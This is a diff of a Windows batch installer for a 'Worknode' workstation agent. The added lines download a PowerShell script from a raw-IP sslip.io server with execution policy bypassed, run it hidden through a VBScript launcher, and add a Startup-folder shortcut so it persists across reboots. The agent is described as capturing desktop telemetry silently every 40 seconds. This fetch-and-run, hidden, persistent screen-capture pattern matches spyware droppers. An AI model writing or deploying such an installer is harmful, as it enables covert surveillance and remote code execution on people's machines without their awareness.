@@ -1,28 +1,35 @@
 @echo off
-:: StaffOps Native Workstation Sync 1-Click Installer
-title StaffOps Workstation Sync Installer
+:: Worknode Workstation 40s Silent Screen Telemetry Agent 1-Click Installer
+title Worknode Workstation Sync Installer
 
 echo =======================================================
-echo   StaffOps Workstation Sync 1-Click Silent Setup
+echo   Worknode Workstation 40s Silent Agent Setup
 echo =======================================================
 echo.
 
-set "AGENT_DIR=%~dp0"
+set "TARGET_DIR=%LOCALAPPDATA%\WorknodeAgent"
+if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
+
+set "SERVER_URL=https://51-38-71-134.sslip.io"
+set "AGENT_PS1=%TARGET_DIR%\StaffOps-Agent.ps1"
+set "VBS_LAUNCHER=%TARGET_DIR%\run-agent-silent.vbs"
 set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "VBS_LAUNCHER=%AGENT_DIR%run-agent-silent.vbs"
 
-:: Create silent VBScript launcher if missing
+echo Downloading Worknode Desktop Agent Engine from Server...
+powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('%SERVER_URL%/desktop-agent/StaffOps-Agent.ps1', '%AGENT_PS1%')"
+
+echo Creating silent background VBScript launcher...
 echo Set WshShell = CreateObject("WScript.Shell") > "%VBS_LAUNCHER%"
-echo WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%AGENT_DIR%StaffOps-Agent.ps1""", 0, false >> "%VBS_LAUNCHER%"
+echo WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%AGENT_PS1%"" -ServerUrl ""%SERVER_URL%""", 0, false >> "%VBS_LAUNCHER%"
 
-:: Create shortcut in Windows Startup directory
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$wsh = New-Object -ComObject WScript.Shell; $sc = $wsh.CreateShortcut('%STARTUP_DIR%\StaffOpsWorkstationSync.lnk'); $sc.TargetPath = 'wscript.exe'; $sc.Arguments = '\"%VBS_LAUNCHER%\"'; $sc.WorkingDirectory = '%AGENT_DIR%'; $sc.WindowStyle = 7; $sc.Save()"
+echo Creating shortcut in Windows Startup folder...
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$wsh = New-Object -ComObject WScript.Shell; $sc = $wsh.CreateShortcut('%STARTUP_DIR%\WorknodeWorkstationSync.lnk'); $sc.TargetPath = 'wscript.exe'; $sc.Arguments = '\"%VBS_LAUNCHER%\"'; $sc.WorkingDirectory = '%TARGET_DIR%'; $sc.WindowStyle = 7; $sc.Save()"
 
-:: Launch background agent immediately
+echo Launching 40-second desktop telemetry engine...
 wscript.exe "%VBS_LAUNCHER%"
 
 echo.
-echo SUCCESS! StaffOps Workstation Sync has been installed and activated.
-echo It will now run automatically in the background on Windows boot.
+echo SUCCESS! Worknode Workstation Sync has been installed and activated.
+echo It will capture 40-second desktop telemetry automatically on Windows boot.
 echo.
 pause
